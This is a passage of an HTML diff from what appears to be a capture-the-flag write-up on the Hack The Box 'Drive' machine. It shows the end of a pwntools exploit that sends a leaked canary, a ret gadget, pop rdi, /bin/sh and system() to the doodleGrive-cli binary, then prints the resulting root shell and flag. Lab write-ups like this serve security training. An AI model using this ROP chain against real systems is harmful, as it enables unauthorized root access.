+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000401941</span>    <span class="c1"># ropper -f doodleGrive-cli --search "ret"</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"canary value -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canaryValue</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"system() addr -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span> 
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"/bin/sh addr -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"POP RDI -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"RET -&gt; </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret</span><span class="p">))</span> 
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">56</span> <span class="c1"># Junk </span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canaryValue</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># Junk for RBP to get to RSP</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="c1"># Stack Allignment</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<p>Let's execute the exploit again:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="n">pwned</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/elswix/Desktop/elswix/HTB/Drive/content/doodleGrive-cli'</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="mf">10.10.11.235</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="p">:</span> <span class="n">Done</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">tom</span><span class="o">@</span><span class="mf">10.10.11.235</span><span class="p">:</span>
+    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mf">20.04</span>
+    <span class="n">OS</span><span class="p">:</span>       <span class="n">linux</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span>
+    <span class="n">Version</span><span class="p">:</span>  <span class="mf">5.4.0</span>
+    <span class="n">ASLR</span><span class="p">:</span>     <span class="n">Enabled</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/home/tom/doodleGrive-cli'</span><span class="p">)</span> <span class="n">on</span> <span class="mf">10.10.11.235</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">2186</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">canary</span> <span class="n">value</span> <span class="o">-&gt;</span> <span class="mh">0x99fc8ea32e780400</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">system</span><span class="p">()</span> <span class="n">addr</span> <span class="o">-&gt;</span> <span class="mh">0x4119d0</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="n">addr</span> <span class="o">-&gt;</span> <span class="mh">0x497cd5</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">POP</span> <span class="n">RDI</span> <span class="o">-&gt;</span> <span class="mh">0x401912</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">RET</span> <span class="o">-&gt;</span> <span class="mh">0x401941</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+<span class="n">Invalid</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="o">.</span>
+<span class="root1">#</span><span class="nd"> $</span><span class="n"> id</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="nb">id</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
+<span class="root1">#</span><span class="nd"> $</span><span class="n"> /bin/id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1003</span><span class="p">(</span><span class="n">tom</span><span class="p">)</span>
+<span class="root1">#</span><span class="nd"> $</span><span class="n"></span>
+</pre></div>
+<p>Finally, we successfully gained access as root on the victim machine. As the program deletes the PATH variable when executing it, we can use the <code>export</code> command to restore the PATH and run programs relatively:</p><br/>
+<div class="highlight"><pre><span></span><span class="root1">#</span><span class="nd"> $</span><span class="n"> export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span>
+<span class="root1">#</span><span class="nd"> $</span><span class="n"> id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1003</span><span class="p">(</span><span class="n">tom</span><span class="p">)</span>
+</pre></div>
+<p>Finally, we can read <code>root.txt</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="root1">#</span><span class="nd"> $</span><span class="n"> cat /root/root.txt</span>
+<span class="n">b3222</span><span class="o">**********************</span><span class="n">d7c9d</span>
+<span class="root1">#</span><span class="nd"> $</span><span class="n"></span>
+</pre></div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
